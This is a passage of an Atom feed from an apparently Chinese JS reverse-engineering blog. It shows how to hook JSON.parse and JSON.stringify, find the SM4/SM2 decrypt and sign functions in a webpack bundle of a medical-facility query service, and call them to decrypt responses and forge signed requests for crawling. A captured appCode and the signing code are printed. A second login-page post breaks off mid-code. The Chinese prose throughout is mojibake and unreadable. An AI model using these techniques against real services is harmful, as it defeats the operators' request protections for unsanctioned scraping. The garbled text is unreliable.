    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-æŸæŸæœåŠ¡ä¸­å¿ƒå®šç‚¹æŸ¥è¯¢webpacké€†å‘</title>
    <link href="https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/"/>
    <id>https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/</id>
    <published>2025-10-28T09:23:40.000Z</published>
    <updated>2025-10-30T15:40:55.927Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥å£æ˜¯æŸ¥è¯¢</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172514877.png" alt="image-20251028172514877"></p><p>å‘ç°è¯·æ±‚å’Œå“åº”åˆ†åˆ«éƒ½æœ‰åŠ å¯†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172615657.png" alt="image-20251028172615657"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172633150.png" alt="image-20251028172633150"></p><h1 id="å“åº”è§£å¯†"><a href="#å“åº”è§£å¯†" class="headerlink" title="å“åº”è§£å¯†"></a>å“åº”è§£å¯†</h1><p>é¦–å…ˆåšå“åº”è§£å¯†ï¼Œæ ¹æ®ç»éªŒï¼Œè§£å¯†ç›´æ¥hook json.parseã€‚ä¹Ÿå¯ä»¥ç›´æ¥æœç´¢ json.parseã€‚</p><h2 id="json-hookæŠ€æœ¯"><a href="#json-hookæŠ€æœ¯" class="headerlink" title="json hookæŠ€æœ¯"></a>json hookæŠ€æœ¯</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> my_stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line"><span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span> (<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œå¯ä»¥æ·»åŠ å…¶ä»–é€»è¾‘æ¯”å¦‚</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;json_stringify params:&quot;</span>,params);</span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">my_stringify</span>(params);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> my_parse = <span class="title class_">JSON</span>.<span class="property">parse</span>;</span><br><span class="line"><span class="title class_">JSON</span>.<span class="property">parse</span> = <span class="keyword">function</span> (<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œå¯ä»¥æ·»åŠ å…¶ä»–é€»è¾‘æ¯”å¦‚</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;json_parse params:&quot;</span>,params);</span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">my_parse</span>(params);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ç†è§£çš„å°±æ˜¯æœ€åè¿”å›ç»™æˆ‘ä»¬çš„æ˜¯jsonæ ¼å¼ï¼Œæœ€ååšäº†ä¸€ä¸‹æ ¼å¼è½¬æ¢è¿™æ ·çš„æ“ä½œæŠŠè§£å¯†ä¹‹åçš„æ•°æ®å±•ç¤ºåˆ°å‰ç«¯ã€‚å¦‚æœæˆ‘ä»¬å®šä½åˆ°äº†ä»–ä½¿ç”¨æ­¤å‡½æ•°å¼€å§‹æŠŠè§£å¯†çš„æ•°æ®å±•ç¤ºåˆ°å‰ç«¯äº†ï¼Œé‚£ä¹ˆå¾€å‰è·Ÿä¸€ä¸‹å †æ ˆï¼Œå°±èƒ½æ‰¾åˆ°è§£å¯†çš„æ“ä½œã€‚</p><h3 id="æ§åˆ¶å°è¾“å…¥hook"><a href="#æ§åˆ¶å°è¾“å…¥hook" class="headerlink" title="æ§åˆ¶å°è¾“å…¥hook"></a>æ§åˆ¶å°è¾“å…¥hook</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173150138.png" alt="image-20251028173150138"></p><p>æ–­ç‚¹åˆ°å·²ç»è§£å¯†åçš„å†…å®¹ã€‚</p><p>åƒè¿™ç§è¿˜æ˜¯å¯†æ–‡çš„ï¼Œç›´æ¥ç•¥è¿‡ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173304161.png" alt="image-20251028173304161"></p><p>æ–­ç‚¹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175813605.png" alt="image-20251028175813605"></p><p>ç‚¹å‡»å³ä¾§å †æ ˆï¼Œå®šä½ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173524092.png" alt="image-20251028173524092"></p><p>ç›´æ¥å‘ç°äº†s.decrypt(n, t)å‡½æ•°ã€‚æ–­ç‚¹åˆ°ä¹‹å‰å’Œä¹‹åï¼Œçœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯è¿™ä¸ªå‡½æ•°åšçš„è§£å¯†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173908859.png" alt="image-20251028173908859"></p><p>è¿›å…¥decryptå‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028174228511.png" alt="image-20251028174228511"></p><p>å…¶å®è¿™é‡Œå†å¾€å‰è·Ÿä¸€æ®µçš„è¯ï¼Œæ˜¯è¿™æ ·ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028174752281.png" alt="image-20251028174752281"></p><p>å°±æ˜¯è°ƒç”¨function g(t, n)å‡½æ•°ï¼Œé‚£ä¹ˆæ€è·¯æ¥äº†ï¼Œæˆ‘ä»¬æŠŠå†…å®¹ä½¿ç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œè°ƒç”¨é‚£ä¸å°±è¡Œäº†ï¼Œç›´æ¥è§£å¯†ï¼Œè°ƒç”¨function g(t, n)å‡½æ•°ä¹‹åè¿˜æœ‰è¿”å›å€¼ï¼Œç¾æ»‹æ»‹ã€‚</p><p>ä½†æ˜¯ä»–è°ƒç”¨çš„æ—¶å€™æ˜¯u.bè°ƒç”¨çš„ï¼Œæˆ‘ä»¬å¾€ä¸Šçœ‹ä¸€ä¸‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028174945573.png" alt="image-20251028174945573"></p><p>è¿™é‡Œè¯´æ˜äº†ï¼Œu.bé‚£å°±æ˜¯gå‡½æ•°ã€‚è€Œä¸”å¾ˆæ˜æ˜¾æœ‰é”®å€¼çš„ï¼Œæ˜¯webpackæ‰“åŒ…è¿‡çš„ï¼Œæ‹‰åˆ°æœ€ä¸Šé¢ï¼ŒåŠ è½½å™¨ä¹Ÿæ‰¾åˆ°äº†ï¼Œè°ƒç”¨çš„æ—¶å€™å£°æ˜ä¸ªå…¨å±€å˜é‡ï¼Œç„¶åå°±èƒ½ä½¿ç”¨gå‡½æ•°äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175042657.png" alt="image-20251028175042657"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="title function_">qifei</span>(<span class="string">&quot;7d92&quot;</span>))</span><br><span class="line">u=<span class="variable language_">window</span>.<span class="title function_">qifei</span>(<span class="string">&quot;7d92&quot;</span>)</span><br><span class="line">e=&#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;signData&quot;</span>: <span class="string">&quot;79uO2S50Sf+V6QfNW022wnJQPpV/geXXRGcfPBhGnScEc48t42kNfe/dnvJiir97mXQq3O06lMMpU8471KGcIw==&quot;</span>,</span><br><span class="line">        <span class="string">&quot;encType&quot;</span>: <span class="string">&quot;SM4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;encData&quot;</span>: <span class="string">&quot;943195DDA5E5337E08E0A527071CC637E0074CBD73D293A3643B2199C79561872E19ABE7BB2600D23E9CDB14C1A75194C1D3C735D2DCC50E297311A423B72BF0AE4781F770874C1AC923AD26618311F1E72934E0FFBB639208EEADCEC17176865992EA3D73E612B17DA2C...........&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;signType&quot;</span>: <span class="string">&quot;SM2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;appCode&quot;</span>: <span class="string">&quot;T98HPCGN5ZVVQBS8LZQNOAEXVI9GYHKQ&quot;</span>,</span><br><span class="line">        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1761618110191&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;æˆåŠŸ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1761618110&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;success&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(u.<span class="title function_">b</span>(<span class="string">&quot;SM4&quot;</span>,e))</span><br></pre></td></tr></table></figure><p>æ³¨æ„1ï¼šæŠŠåˆå§‹åŒ–çš„åœ°æ–¹æ³¨é‡Šæ‰ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175428054.png" alt="image-20251028175428054"></p><p>æ³¨æ„2ï¼šæˆ‘åœ¨åŠ è½½å™¨ä¸‹é¢å†™äº†å£°æ˜ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175543095.png" alt="image-20251028175543095"></p><h2 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175623315.png" alt="image-20251028175623315"></p><h1 id="è¯·æ±‚åŒ…åŠ å¯†"><a href="#è¯·æ±‚åŒ…åŠ å¯†" class="headerlink" title="è¯·æ±‚åŒ…åŠ å¯†"></a>è¯·æ±‚åŒ…åŠ å¯†</h1><p>è¿™é‡Œæˆ‘æ˜¯è¦json hookå®šä½ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> my_stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line"><span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span> (<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œå¯ä»¥æ·»åŠ å…¶ä»–é€»è¾‘æ¯”å¦‚</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;json_stringify params:&quot;</span>,params);</span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">my_stringify</span>(params);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180031974.png" alt="image-20251028180031974"></p><p>å¾€ä¸Šè·Ÿå †æ ˆ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180347822.png" alt="image-20251028180347822"></p><p>å‘ç°ä¸‹é¢æœ‰ä¸ªencData,å¾ˆå¯ç–‘ã€‚</p><p>å‘ç°è¿™é‡Œä¹Ÿè§¦å‘äº†hookã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180523332.png" alt="image-20251028180523332"></p><p>å¾€ä¸‹èµ°ï¼Œå‘ç°lå€¼å°±æ˜¯æˆ‘ä»¬çš„åŠ å¯†çš„æ•°æ®ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180658322.png" alt="image-20251028180658322"></p><p>çœ‹æ•´ä¸ª   function f(t)å‡½æ•°ï¼Œå°±æ˜¯å¯¹è¯·æ±‚åŒ…åšä¸€äº›å¤„ç†ï¼Œå› ä¸ºè¿™é‡Œæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œç›´æ¥æŠŠå®Œç¾çš„åŠ å¯†è¯·æ±‚ç»™æˆ‘ä»¬ã€‚æ³¨æ„éœ€è¦ä¼ å…¥çš„ä¸œè¥¿å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ¼å¼ï¼Œçˆ¬è™«çš„æ—¶å€™æ”¹ä¸‹é¢å°±è¡Œäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&quot;addr&quot;:&quot;&quot;,&quot;regnCode&quot;:&quot;140100&quot;,&quot;medinsName&quot;:&quot;&quot;,&quot;medinsLvCode&quot;:&quot;&quot;,&quot;medinsTypeCode&quot;:&quot;&quot;,&quot;outMedOpenFlag&quot;:&quot;&quot;,&quot;pageNum&quot;:1,&quot;pageSize&quot;:10,&quot;queryDataSource&quot;:&quot;es&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181006327.png" alt="image-20251028181006327"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = <span class="title function_">n</span>(<span class="string">&quot;6c27&quot;</span>).<span class="property">sha256</span></span><br><span class="line">      , s = <span class="title class_">Math</span>.<span class="title function_">ceil</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() / <span class="number">1e3</span>)</span><br><span class="line">      , h = <span class="title class_">Object</span>(i.<span class="property">a</span>)()</span><br><span class="line">      , f = s + h + s;</span><br><span class="line">    <span class="keyword">return</span> t.<span class="property">headers</span>[<span class="string">&quot;x-tif-paasid&quot;</span>] = l.<span class="property">paasId</span>,</span><br><span class="line">    t.<span class="property">headers</span>[<span class="string">&quot;x-tif-signature&quot;</span>] = <span class="title function_">r</span>(f),</span><br><span class="line">    t.<span class="property">headers</span>[<span class="string">&quot;x-tif-timestamp&quot;</span>] = s,</span><br><span class="line">    t.<span class="property">headers</span>[<span class="string">&quot;x-tif-nonce&quot;</span>] = h,</span><br><span class="line">    t.<span class="property">headers</span>.<span class="property">Accept</span> = <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    t.<span class="property">headers</span>.<span class="property">contentType</span> = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    t.<span class="property">data</span> = &#123;</span><br><span class="line">        <span class="attr">data</span>: t.<span class="property">data</span> || &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">appCode</span> = l.<span class="property">appCode</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">version</span> = l.<span class="property">version</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">encType</span> = <span class="string">&quot;SM4&quot;</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">signType</span> = <span class="string">&quot;SM2&quot;</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">timestamp</span> = s,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">signData</span> = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title function_">m</span>(t.<span class="property">data</span>)</span><br><span class="line">              , i = <span class="title function_">p</span>(n);</span><br><span class="line">            i.<span class="property">data</span> = <span class="title function_">p</span>(i.<span class="property">data</span>);</span><br><span class="line">            <span class="keyword">var</span> r = <span class="title function_">v</span>(i)</span><br><span class="line">              , a = o.<span class="title function_">doSignature</span>(r, d, &#123;</span><br><span class="line">                <span class="attr">hash</span>: !<span class="number">0</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">from</span>(a, <span class="string">&quot;hex&quot;</span>).<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;(t),</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">data</span> = &#123;</span><br><span class="line">        <span class="attr">encData</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (e.<span class="title function_">toUpperCase</span>()) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;SM2&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = o.<span class="title function_">generateKeyPairHex</span>()</span><br><span class="line">                          , n = t.<span class="property">publicKey</span></span><br><span class="line">                          , i = e;</span><br><span class="line">                        o.<span class="title function_">doEncrypt</span>(i, n, <span class="number">1</span>)</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;(t);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;SM3&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = <span class="title function_">a</span>(e);</span><br><span class="line">                        <span class="keyword">return</span> t</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;(t);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;SM4&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">data</span>.<span class="property">data</span> &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">data</span>.<span class="property">data</span>), n = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i)</span><br><span class="line">                              , o = t.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">                            n += o &gt; <span class="number">127</span> ? <span class="string">&quot;\\u&quot;</span> + o.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">4</span>, <span class="string">&quot;0&quot;</span>) : r</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">var</span> a = <span class="title function_">A</span>(n);</span><br><span class="line">                        e.<span class="property">data</span>.<span class="property">appCode</span> &amp;&amp; e.<span class="property">data</span>.<span class="property">appCode</span> !== u &amp;&amp; (u = e.<span class="property">data</span>.<span class="property">appCode</span>);</span><br><span class="line">                        <span class="keyword">var</span> s = <span class="title function_">y</span>(u, c)</span><br><span class="line">                          , l = <span class="title function_">b</span>(s, a);</span><br><span class="line">                        <span class="keyword">return</span> l.<span class="title function_">toUpperCase</span>()</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;(<span class="string">&quot;SM4&quot;</span>, t)</span><br><span class="line">    &#125;,</span><br><span class="line">    t.<span class="property">data</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">data</span>: t.<span class="property">data</span></span><br><span class="line">    &#125;),</span><br><span class="line">    t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾€ä¸Šè·Ÿå †æ ˆå‘ç°ï¼Œæ˜¯å¦‚æ­¤è°ƒç”¨çš„ã€‚u.aæ˜¯å¦è·Ÿä¸Šæ–‡u.bä¸€æ ·ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181048767.png" alt="image-20251028181048767"></p><p>æˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬éœ€è¦è°ƒç”¨u.aæ¥è°ƒç”¨function f(t)å‡½æ•°ã€‚</p><p>é‚£ä¹ˆå°±æ˜äº†äº†ï¼Œæµ‹è¯•å‡ºç»“æœã€‚</p><h1 id="ä»£ç æ¼”ç¤º"><a href="#ä»£ç æ¼”ç¤º" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181252843.png" alt="image-20251028181252843"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181315535.png" alt="image-20251028181315535"></p><p>çœ‹ä¸€ä¸‹ç¬¬äºŒé¡µæ˜¯å¦å¯¹åº”ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181411153.png" alt="image-20251028181411153"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181526726.png" alt="image-20251028181526726"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181515681.png" alt="image-20251028181515681"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥å£æ˜¯æŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172514877.png&quot; alt=&quot;image-202510281</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-æŸæŸMetaç™»å½•Webpacké€†å‘</title>
    <link href="https://250wuyifan.github.io/2025/10/27/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90Meta%E7%99%BB%E5%BD%95Webpack%E9%80%86%E5%90%91/"/>
    <id>https://250wuyifan.github.io/2025/10/27/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90Meta%E7%99%BB%E5%BD%95Webpack%E9%80%86%E5%90%91/</id>
    <published>2025-10-27T15:47:45.000Z</published>
    <updated>2025-10-27T15:50:38.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.52pojie.cn/thread-2065436-1-1.html">https://www.52pojie.cn/thread-2065436-1-1.html</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027234923867.png" alt="image-20251027234923867"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027234831011.png" alt="image-20251027234831011"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027234850985.png" alt="image-20251027234850985"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span> = globalThis;</span><br><span class="line"><span class="keyword">var</span> myLoader;</span><br><span class="line"></span><br><span class="line">(<span class="variable language_">window</span>[<span class="string">&quot;webpackJsonp&quot;</span>] = <span class="variable language_">window</span>[<span class="string">&quot;webpackJsonp&quot;</span>] || []).<span class="title function_">push</span>([[<span class="string">&quot;chunk-vendors&quot;</span>], &#123;...&#125;]);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">e</span>) &#123;...&#125;)(&#123;...&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="title function_">myLoader</span>(<span class="string">&quot;8237&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> l = myLoader.<span class="title function_">n</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d</span>(<span class="params"></span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params">e, t</span>) &#123;...&#125;)(d, <span class="number">185391</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">g</span> = (<span class="params">e, t</span>) =&gt; &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">k</span>(<span class="params">e, t</span>) &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">y</span> = (<span class="params">e, t</span>) =&gt; &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> u = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span 